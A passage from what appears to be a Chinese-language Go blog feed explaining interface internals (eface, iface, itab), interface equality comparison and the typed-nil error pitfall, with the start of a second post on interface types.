class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> p *MyError = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> bad() &#123;</span><br><span class="line">        p = &amp;ErrBad</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    err := returnsError()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"error occur: %+v\n"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">"ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，程序的运行逻辑很清晰，调用 returnsError 函数返回指针变量 p，值为 nil，然后比较 err 变量是否等于 nil，最后输出结果。</p><p>运行一下示例代码，看看结果是否和预期一致：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error occur: &lt;<span class="literal">nil</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看到，并没有输出预期的 ok，这是怎么回事呢？要搞清楚这个问题，需要进一步了解接口类型变量的内部表示。</p><h3 id="接口类型变量的内部表示"><a href="#接口类型变量的内部表示" class="headerlink" title="接口类型变量的内部表示"></a>接口类型变量的内部表示</h3><p>接口类型“动静兼备”的特性也决定了它的变量的内部表示绝不像一个静态类型变量（如 int、float64）那样简单。</p><p>在Go 的源码中可以找到接口类型变量在运行时的表示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/runtime/runtime2.go</span></span><br><span class="line"><span class="keyword">type</span> iface <span class="keyword">struct</span> &#123;</span><br><span class="line">    tab  *itab</span><br><span class="line">    data unsafe.Pointer</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> eface <span class="keyword">struct</span> &#123;</span><br><span class="line">    _type *_type</span><br><span class="line">    data  unsafe.Pointer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在运行时层面，接口类型变量有两种内部表示：<code>iface</code> 和 <code>eface</code>，这两种表示分别用于不同的接口类型变量：</p><ul><li>eface 用于表示没有方法的空接口（empty interface）类型变量，也就是 <code>interface{}</code>类型的变量</li><li>iface 用于表示其余拥有方法的接口 interface 类型变量</li></ul><p>它们的共同点是都拥有两个指针字段，并且功能相同，都是指向<strong>当前赋值给该接口类型变量的动态类型变量的值</strong>。</p><p>不同点在于，eface 表示空接口类型，并没有方法列表，<br>因此它的第一个指针字段指向一个 <code>_type</code> 类型结构，这个接口为该接口类型变量的动态类型信息，定义是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/runtime/type.go</span></span><br><span class="line"><span class="keyword">type</span> _type <span class="keyword">struct</span> &#123;</span><br><span class="line">    size       <span class="keyword">uintptr</span></span><br><span class="line">    ptrdata    <span class="keyword">uintptr</span> <span class="comment">// size of memory prefix holding all pointers</span></span><br><span class="line">    hash       <span class="keyword">uint32</span></span><br><span class="line">    tflag      tflag</span><br><span class="line">    align      <span class="keyword">uint8</span></span><br><span class="line">    fieldAlign <span class="keyword">uint8</span></span><br><span class="line">    kind       <span class="keyword">uint8</span></span><br><span class="line">    <span class="comment">// function for comparing objects of this type</span></span><br><span class="line">    <span class="comment">// (ptr to object A, ptr to object B) -&gt; ==?</span></span><br><span class="line">    equal <span class="function"><span class="keyword">func</span><span class="params">(unsafe.Pointer, unsafe.Pointer)</span> <span class="title">bool</span></span></span><br><span class="line">    <span class="comment">// gcdata stores the GC type data for the garbage collector.</span></span><br><span class="line">    <span class="comment">// If the KindGCProg bit is set in kind, gcdata is a GC program.</span></span><br><span class="line">    <span class="comment">// Otherwise it is a ptrmask bitmap. See mbitmap.go for details.</span></span><br><span class="line">    gcdata    *<span class="keyword">byte</span></span><br><span class="line">    str       nameOff</span><br><span class="line">    ptrToThis typeOff</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 iface 除了要存储动态类型信息之外，还有存储接口本身的信息（接口的类型信息、方法列表信息等）以及动态类型所实现的方法的信息，因此 iface 的第一个字段指向一个itab类型结构。itab 结构的定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/runtime/runtime2.go</span></span><br><span class="line"><span class="keyword">type</span> itab <span class="keyword">struct</span> &#123;</span><br><span class="line">    inter *interfacetype</span><br><span class="line">    _type *_type</span><br><span class="line">    hash  <span class="keyword">uint32</span> <span class="comment">// copy of _type.hash. Used for type switches.</span></span><br><span class="line">    _     [<span class="number">4</span>]<span class="keyword">byte</span></span><br><span class="line">    fun   [<span class="number">1</span>]<span class="keyword">uintptr</span> <span class="comment">// variable sized. fun[0]==0 means _type does not implement inter.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心字段如下：</p><ul><li>inter：存储着这个接口类型自身的信息</li><li>_type：存储着这个接口类型变量的动态类型的信息</li><li>func：动态类型已实现的接口方法的调用地址数组</li></ul><p>其中 interfacetype 结构的定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/runtime/type.go</span></span><br><span class="line"><span class="keyword">type</span> interfacetype <span class="keyword">struct</span> &#123;</span><br><span class="line">    typ     _type       <span class="comment">// interfacetype 结构由类型信息</span></span><br><span class="line">    pkgpath name        <span class="comment">// 包路径名</span></span><br><span class="line">    mhdr    []imethod   <span class="comment">// 接口方法集合切片（mhdr）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了更好地理解 eface 与 iface 在内存的表示，下面分别</p><h2 id="空接口类型内存中表示"><a href="#空接口类型内存中表示" class="headerlink" title="空接口类型内存中表示"></a>空接口类型内存中表示</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> t = T&#123;</span><br><span class="line">age:  <span class="number">23</span>,</span><br><span class="line">name: <span class="string">"yumi"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ei <span class="keyword">interface</span>&#123;&#125; = t   <span class="comment">// Go运行时使用eface结构表示ei</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">println</span>(<span class="string">"ei = "</span>, ei)      <span class="comment">// ei =  (0x1097d60,0xc00000c030)</span></span><br><span class="line">fmt.Println(<span class="string">"ei = "</span>, ei)  <span class="comment">// ei =  &#123;yumi 23&#125;</span></span><br><span class="line">fmt.Printf(<span class="string">"%T \n"</span>, ei)   <span class="comment">// main.T </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该示例代码中的空接口类型变量 ei 在内存中的表示 如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/%E7%A9%BA%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt=""></p><p>可以看到空接口类型的表示较为简单：</p><ul><li>_type 字段指向它的动态类型 T 的类型信息</li><li>data 字段指向一个 T 类型的实例值</li></ul><h3 id="非空接口类型内存中表示"><a href="#非空接口类型内存中表示" class="headerlink" title="非空接口类型内存中表示"></a>非空接口类型内存中表示</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M1</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> NonEmptyInterface <span class="keyword">interface</span> &#123;</span><br><span class="line">M1()</span><br><span class="line">M2()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> t = T&#123;</span><br><span class="line">name: <span class="string">"yumi"</span>,</span><br><span class="line">age:  <span class="number">23</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i NonEmptyInterface = t</span><br><span class="line">  </span><br><span class="line"><span class="built_in">println</span>(<span class="string">"i = "</span>, i)        <span class="comment">// i =  (0x10c2248,0xc0000a4018)</span></span><br><span class="line">fmt.Println(<span class="string">"i = "</span>, i)    <span class="comment">// i =  &#123;yumi 23&#125;</span></span><br><span class="line">fmt.Printf(<span class="string">"%T \n"</span>, i)    <span class="comment">// main.T</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和 eface 比起来，iface 的表示稍微复杂些，下图是 接口类型变量i 在内存中的表示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/%E9%9D%9E%E7%A9%BA%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt=""></p><p>虽然 eface 和 iface 的第一个字段有所差别，但 tab 和 _type 可以统一看作是动态类型信息。Go 语言中每种类型都会有唯一的 _type 信息，无论是内置原生类型，还是自定义类型都有。Go 运行时会为程序内的全部类型建立只读的共享 _type 信息表，因此<strong>拥有相同动态类型的同类接口类型变量的 _type/tab 信息是相同的</strong>。</p><p>接口类型变量的 data 部分则是指向一个动态分配的内存空间，这个内存空间存储的是赋值给接口类型变量的动态类型变量的值。<br>未显式初始化的接口类型变量的值为 nil，也就是这个变量的 _type/tab 和 data 都为 nil。</p><p>也就是说，判断两个接口类型变量是否相同，<strong>只需要判断 _type/tab 是否相同，以及 data 指针指向的内存空间所存储的数据值是否相同</strong>就可以了。<br>注意 🚧，这里不是 data 指针的值相同。</p><h2 id="比较接口变量"><a href="#比较接口变量" class="headerlink" title="比较接口变量"></a>比较接口变量</h2><h3 id="nil-接口变量"><a href="#nil-接口变量" class="headerlink" title="nil 接口变量"></a>nil 接口变量</h3><p>未赋初值的接口类型变量的值为 nil，这类变量也就是 nil 接口变量，下面来看一下内存中表示输出的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printNilInterface</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// nil接口变量</span></span><br><span class="line"><span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; <span class="comment">// 空接口类型</span></span><br><span class="line"><span class="keyword">var</span> err error     <span class="comment">// 非空接口类型</span></span><br><span class="line"><span class="built_in">println</span>(i)</span><br><span class="line"><span class="built_in">println</span>(err)</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"i = nil:"</span>, i == <span class="literal">nil</span>)</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"err = nil:"</span>, err == <span class="literal">nil</span>)</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"i = err:"</span>, i == err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">(<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">i = <span class="literal">nil</span>: <span class="literal">true</span></span><br><span class="line">err = <span class="literal">nil</span>: <span class="literal">true</span></span><br><span class="line">i = err: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>可以看到，无论是空接口类型变量还是非空接口类型变量，一旦变量值为 nil，那么它们内部表示均为<code>(0x0,0x0)</code>，也就是类型信息、数据值信息均为空。因此上面的变量 i 和 err 等值判断为 true。</p><h3 id="空接口类型变量"><a href="#空接口类型变量" class="headerlink" title="空接口类型变量"></a>空接口类型变量</h3><p>下面是空接口类型变量的内部表示输出的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printEmptyInterface</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> eif1 <span class="keyword">interface</span>&#123;&#125; <span class="comment">// 空接口类型</span></span><br><span class="line">    <span class="keyword">var</span> eif2 <span class="keyword">interface</span>&#123;&#125; <span class="comment">// 空接口类型</span></span><br><span class="line">    <span class="keyword">var</span> n, m <span class="keyword">int</span> = <span class="number">17</span>, <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    eif1 = n</span><br><span class="line">    eif2 = m</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif1:"</span>, eif1)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif2:"</span>, eif2)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif1 = eif2:"</span>, eif1 == eif2) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">    eif2 = <span class="number">17</span></span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif1:"</span>, eif1)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif2:"</span>, eif2)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif1 = eif2:"</span>, eif1 == eif2) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">    eif2 = <span class="keyword">int64</span>(<span class="number">17</span>)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif1:"</span>, eif1)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif2:"</span>, eif2)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"eif1 = eif2:"</span>, eif1 == eif2) <span class="comment">// false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eif1: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef48</span>)</span><br><span class="line">eif2: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef40</span>)</span><br><span class="line">eif1 = eif2: <span class="literal">false</span></span><br><span class="line">eif1: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef48</span>)</span><br><span class="line">eif2: (<span class="number">0x10ac580</span>,<span class="number">0x10eb3d0</span>)</span><br><span class="line">eif1 = eif2: <span class="literal">true</span></span><br><span class="line">eif1: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef48</span>)</span><br><span class="line">eif2: (<span class="number">0x10ac640</span>,<span class="number">0x10eb3d8</span>)</span><br><span class="line">eif1 = eif2: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>示例代码的逻辑很清晰：</p><ul><li>第一次打印：动态类型的类型信息是相同的（都是 int），所以 _type 都是0x10ac580，但是 data 指针指向内存中存储的值不一样，因此 eif1 不等于 eif2</li><li>第二次打印：动态类型的类型信息是相同的，data 指针指向内存中存储的值也相同，因此 eif1 等于 eif2</li><li>第三次打印：动态类型的类型信息不同（一个是 int，一个是 int64），即便 data 指针指向的内存块中存储值是相同的，最终 eif1 也不等于 eif2</li></ul><p>结论：<strong>对于空接口类型变量，只有 _type 和 data 所指数据内容一致的情况下，两个空接口类型变量之间才能划等号</strong>。</p><h3 id="非空接口类型变量"><a href="#非空接口类型变量" class="headerlink" title="非空接口类型变量"></a>非空接口类型变量</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">int</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">Error</span><span class="params">()</span> <span class="title">string</span></span> &#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"bad error"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printNonEmptyInterface</span><span class="params">()</span></span> &#123; </span><br><span class="line">    <span class="keyword">var</span> err1 error <span class="comment">// 非空接口类型</span></span><br><span class="line">    <span class="keyword">var</span> err2 error <span class="comment">// 非空接口类型</span></span><br><span class="line">    err1 = (*T)(<span class="literal">nil</span>)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err1:"</span>, err1)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err1 = nil:"</span>, err1 == <span class="literal">nil</span>)</span><br><span class="line">    err1 = T(<span class="number">5</span>)</span><br><span class="line">    err2 = T(<span class="number">6</span>)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err1:"</span>, err1)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err2:"</span>, err2)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err1 = err2:"</span>, err1 == err2)</span><br><span class="line">    err2 = fmt.Errorf(<span class="string">"%d\n"</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err1:"</span>, err1)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err2:"</span>, err2)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"err1 = err2:"</span>, err1 == err2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eif1: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef48</span>)</span><br><span class="line">eif2: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef40</span>)</span><br><span class="line">eif1 = eif2: <span class="literal">false</span></span><br><span class="line">eif1: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef48</span>)</span><br><span class="line">eif2: (<span class="number">0x10ac580</span>,<span class="number">0x10eb3d0</span>)</span><br><span class="line">eif1 = eif2: <span class="literal">true</span></span><br><span class="line">eif1: (<span class="number">0x10ac580</span>,<span class="number">0xc00007ef48</span>)</span><br><span class="line">eif2: (<span class="number">0x10ac640</span>,<span class="number">0x10eb3d8</span>)</span><br><span class="line">eif1 = eif2: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>看到上面示例中每一轮通过 println 输出的 err1 和 err2 的 tab 和 data 值，要么 data 值不同，要么 tab 与 data 值都不同。</p><p>和空接口类型变量一样，只有 tab 和 data 指的数据内容一致的情况下，两个非空接口类型变量之间才能划等号。</p><p>这里我们要注意 err1 下面的赋值情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">err1 &#x3D; (*T)(nil)</span><br></pre></td></tr></table></figure><p>针对这种赋值，println 输出的 err1 是（0x10ed120, 0x0），也就是非空接口类型变量的类型信息并不为空，数据指针为空，因此它与 nil（0x0,0x0）之间不能划等号。</p><p>现在我们再回到我们开头的那个问题，你是不是已经豁然开朗了呢？开头的问题中，从 returnsError 返回的 error 接口类型变量 err 的数据指针虽然为空，但它的类型信息（iface.tab）并不为空，而是 *MyError 对应的类型信息，这样 err 与 nil（0x0,0x0）相比自然不相等，这就是我们开头那个问题的答案解析，现在你明白了吗？</p><p>现在再回头看上面那个问题，是不是清晰很多了。<br>因为 returnsError 返回的 error 接口类型变量 err 的数据指针虽然为空，但它的类型信息（iface.data) 并不为空，而是 <code>*MyError</code> 对应的类型信息，因此 err 与 nil 并不相等。</p><h3 id="空接口类型变量与非空接口类型变量的等值比较"><a href="#空接口类型变量与非空接口类型变量的等值比较" class="headerlink" title="空接口类型变量与非空接口类型变量的等值比较"></a>空接口类型变量与非空接口类型变量的等值比较</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printEmptyInterfaceAndNonEmptyInterface</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">var</span> eif <span class="keyword">interface</span>&#123;&#125; = T(<span class="number">5</span>)</span><br><span class="line">  <span class="keyword">var</span> err error = T(<span class="number">5</span>)</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">"eif:"</span>, eif)</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">"err:"</span>, err)</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">"eif = err:"</span>, eif == err)</span><br><span class="line">  err = T(<span class="number">6</span>)</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">"eif:"</span>, eif)</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">"err:"</span>, err)</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">"eif = err:"</span>, eif == err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eif: (<span class="number">0x1093500</span>,<span class="number">0x10c0808</span>)</span><br><span class="line">err: (<span class="number">0x10c0d58</span>,<span class="number">0x10c0808</span>)</span><br><span class="line">eif = err: <span class="literal">true</span></span><br><span class="line">eif: (<span class="number">0x1093500</span>,<span class="number">0x10c0808</span>)</span><br><span class="line">err: (<span class="number">0x10c0d58</span>,<span class="number">0x10c0810</span>)</span><br><span class="line">eif = err: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>可以看到，虽然空接口类型变量（eface(_type, data)）和非空接口类型变量（iface(tab, data)）内部表示的结构不一样，但Go 在进行等值比较时，类型比较用的是 eface._type 和 eface.tab._type，因此在这个例子中，eif 和 err 都是T(5) 时，两者是相等的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>动态特性让 Go 拥有与动态语言相近的灵活性，而静态特性又在编译阶段保证了这种灵活性的安全</li><li>判断两个接口类型变量是否相同，不仅需要 _type/tab 相同，还需要 data 指针指向的内存空间的值相同</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——接口</title>
      <link href="/go-language-study-notes-interface/"/>
      <url>/go-language-study-notes-interface/</url>
      
        <content type="html"><![CDATA[<p>在前面的笔记中，已经很多次用到了接口，但是还没有真正介绍它，是因为它和并发原语（Goroutine、channel、select）一样重要，更考验理解力，所以放在后面一些。</p><p>下面就正式进入接口的学习了。</p><a id="more"></a><h2 id="接口类型"><a href="#接口类型" class="headerlink" title="接口类型"></a>接口类型</h2><p><strong>接口类型是由 type 和 interface 关键字定义的一组方法集合</strong>，其中，<strong>方法集合</strong>唯一确定了这个接口类型所表示的接口。</p><p>下面是一个典型的接口类型定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> MyInterface <span class="keyword">interface</span> &#123;</span><br><span class="line">  M1(<span class="keyword">int</span>) error</span><br><span class="line">  M2(io.Writer, ...<span class="keyword">string</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个定义，可以看到，接口类型 MyInterface 所表示的接口的方法集合，包含两个方法 M1 和 M2。<strong>之所以称 M1 和 M2 为“方法”，更多是从这个接口的实现者的角度考虑的</strong>。</p><p>接口类型的方法集合中声明的方法，它的参数列表不需要写出形参名字，返回值列表也是如此。</p><p>Go 语言要求接口类型声明中的方法必须是具名的，并且方法名字在这个接口类型的方法集合中是唯一的。</p><p>Go 接口类型允许嵌入的不同接口类型的方法集合存在交集，但前提是交集中的方法不仅名字要一样，它的函数签名部分也要保持一致，也就是参数列表与返回值列表也要相同，否则 Go 编译器照样会报错。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface1 <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Interface2 <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1(<span class="keyword">string</span>) </span><br><span class="line">    M2()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Interface3 <span class="keyword">interface</span>&#123;</span><br><span class="line">    Interface1</span><br><span class="line">    Interface2 <span class="comment">// 编译器报错：duplicate method M1</span></span><br><span class="line">    M3()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口类型定义中也可以声明首字母小写的非导出方法，不过，在日常的编码过程中，较少使用这种非导出方法的接口类型。</p><h3 id="空接口类型"><a href="#空接口类型" class="headerlink" title="空接口类型"></a>空接口类型</h3><p>如果一个接口类型定义中没有一个方法，那么它的方法集合就为空：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 